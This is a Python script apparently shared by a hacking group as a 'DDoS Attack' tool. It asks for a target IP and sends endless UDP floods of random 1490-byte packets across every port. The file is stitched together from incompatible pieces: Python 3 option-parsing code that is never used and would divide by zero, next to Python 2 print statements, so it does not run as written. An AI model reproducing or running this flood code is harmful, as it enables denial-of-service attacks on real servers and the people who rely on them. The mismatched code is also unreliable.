print ("\033[91m")
import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year


###############

from optparse import OptionParser
import threading,time,sys,logging,urllib.request,random
from time import sleep
from queue import Queue
import rich
from rich.markdown import Markdown
from rich.progress import track
from rich.console import Console


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
target = ""
ports = 0 
levels = 0
fake_ip = ""
hides = 0
console = Console()
already_connected_true = 0
already_connected_false = 1


def live_bro():
            if already_connected_true % hides ==0:
                console.print(f"[{time.ctime(time.time())}] connected : {already_connected_true}",style="green")
            else:
                pass
            if already_connected_false % hides ==0 :
                console.print(f"Wrong : {already_connected_false}",style="red")
            else:
                pass
                
              
                
                

 #Scrypt Typer  
def get_Typer():
	global host
	global port
	global thr
	global item
	global target
	global ports
	global levels
	global fake_ip
	global hides
	optp = OptionParser(add_help_option=False,epilog=" SHINE DDOS ATTACK")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-i","--ip", dest="host",help="attack to server ip -i ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-l","--level",type="int",dest="turbo",help="default 1 -t 1")
	optp.add_option("-f","--fake",type="str",dest="fake",help="default -f 00.00.00.00")
	optp.add_option("-d","--hide",type="int",dest="hide",help="default -d 200")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
		usage1()
		sys.exit()
	if opts.host is not None:
		host = opts.host
		target = host
	else:
		pass
	if opts.port is None:
		port = 80
		ports =port
	else:
		port = opts.port
		ports =port
	if opts.turbo is None:
		thr = 1
		levels = thr
	else:
		thr = opts.turbo
		levels = thr
	if opts.fake is not None:
		hos = opts.fake
		fake_ip = hos
	else:
		fake_ip = "999.999.999.999"
	if opts.hide is None:
		hide = 0
		hides = hide
	else:
		hide = opts.hide
		hides = hide
###############

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet SYNC")
print
print "Coded By : AHMAD KASHU"
print "Author   : TEAM SYNC"
print "Github   : github.com/T3AmSyNc"
print "Telegram : t.me/T3aMsYnC"
print "FOR JOINING OUR TEAM YOU HAVE TO BE A LEGAL PERSON JOIN OUR TELEGRAM CHANNEL"
print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems ONLY TEAM SYNC USERS CAN USE IT LEGALLY"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
os.system("clear")
print("\033[93m")
os.system("figlet DdoS Attack")
print(" Team : TEAM SYNC ON TOP ")
print ("\033[92m")
print "[TEAM                    ] 0% "
time.sleep(5)
print "[SYNC =====               ] 25%"
time.sleep(5)
print "[ON ==========          ] 50%"
time.sleep(5)
print "[TOP ===============     ] 75%"
time.sleep(5)
print "[LEMME START====================] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sended %s packet to %s via port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

